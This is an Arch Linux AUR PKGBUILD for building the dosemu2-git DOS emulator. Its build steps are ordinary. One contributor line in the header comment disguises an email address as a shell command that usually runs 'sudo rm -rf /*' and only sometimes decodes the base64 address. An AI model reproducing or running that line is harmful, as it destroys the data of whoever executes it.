# Maintainer: Chris Severance aur.severach aATt spamgourmet dott com
# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Based on dosemu-git:
# Maintainer: Mike Swanson <mikeonthecomputer@gmail.com>
# Based on the Arch Linux PKGBUILD by:
# Maintainer: Sergej Pupykin <pupykin.s+arch@gmail.com>
# Contributor: Jaroslaw Swierczynski <swiergot@aur.archlinux.org>
# Contributor: Eric Belanger <belanger@astro.umontreal.ca>
# Contributor: Bob Finch <w9ya@arrl.net>

set -u
_opt_Debug=0

pkgname='dosemu2-git'
pkgver=2.0pre6.1+dev+32+gc44b164
pkgrel=1
pkgdesc='Virtual machine that allows you to run DOS programs under Linux'
arch=('i686' 'x86_64')
url='https://stsp.github.io/dosemu2/'
license=('GPL' 'custom')
depends=('glibc')
optdepends=(
  'vde2: networking support'
  'sdl2: graphical display'
  'slang: console display'
  'gpm: mouse support in console'
  'libao: audio output'
  'fluidsynth: MIDI support'
)
if [ "${_opt_Debug}" -ne 0 ]; then
  optdepends+=('gdb: debug support')
else
  depends+=('gdb')
fi
makedepends=('git')
provides=('dosemu=2.0')
conflicts=('dosemu')
backup=(
  'etc/dosemu/dosemu.conf'
# 'etc/dosemu/dosemu.users'
# 'etc/dosemu/global.conf'
)
_freedos='dosemu-freedos-1.1-bin.tgz'
source=(
  'git+https://github.com/stsp/dosemu2.git'
  "https://dl.dropboxusercontent.com/u/13513277/dosemu/${_freedos}"
  'build-system.patch'
  'xdosemu.desktop'
)
noextract=("${_freedos}")
sha256sums=('SKIP'
            '0891a8346ee58f8468ab17f93315d6f23fe68348d297be39c1faad5bd6e59613'
            'c4364f3837744775faebeac86ad22e5b636db411942c6e21e74e9b3277e066cf'
            'ed210a850a1102fbf56bfd8a34b5dddca538caa2eee39210ee612406891c3e5a')

pkgver() {
  set -u
  cd 'dosemu2'
  git describe --long | sed -e 's/^dosemu2-//; y/-/+/'
  set +u
}

prepare() {
  set -u
  cd 'dosemu2'

  #patch -Np1 < ../build-system.patch
  #sed -ie '/yyget_leng/ s/int/size_t/' src/base/init/lexer.h
  ln -s "../${_freedos}" 'dosemu-freedos-1.1-bin.tgz' # 'dosemu-freedos-bin.tgz'
  sed -i -e '# Enable VDE' \
         -e 's:^\(\s*plugin_vde\)\s.*$:\1 on:g' \
         -e '# Adjust conf folder /etc' \
         -e 's:^\(\s*sysconfdir\)\s.*$:\1 /etc/dosemu:g' \
         -e '# Newer freedos' \
         -e 's:^\(\s*fdtarball\)\s.*$:\1 dosemu-freedos-1.1-bin.tgz:g' \
         -e '# Prefix' \
         -e 's:^}$:  prefix=/usr\n&:g' \
    'compiletime-settings'
  if [ "${_opt_Debug}" -ne 0 ]; then
    sed -i -e 's:^\(\s*debug\)\s.*$:\1 on:g' \
      'compiletime-settings'
  fi
  ./autogen.sh
  CFLAGS="${CFLAGS} -Wno-unused-result" \
  ./default-configure
  set +u
}

build() {
  set -u
  cd 'dosemu2'
  local _nproc="$(nproc)"; _nproc=$((_nproc>8?8:_nproc))
  make -s -j "${_nproc}"
  set +u
}

package() {
  set -u
  cd 'dosemu2'
  make DESTDIR="${pkgdir}" install
  install -Dpm644 "${srcdir}/xdosemu.desktop" -t "${pkgdir}/usr/share/applications/"
  install -Dpm644 'etc/dosemu.xpm' -t "${pkgdir}/usr/share/icons/"
  install -Dpm644 'COPYING' 'COPYING.DOSEMU' -t "${pkgdir}/usr/share/licenses/${pkgname}/"
  set +u
}

set +u
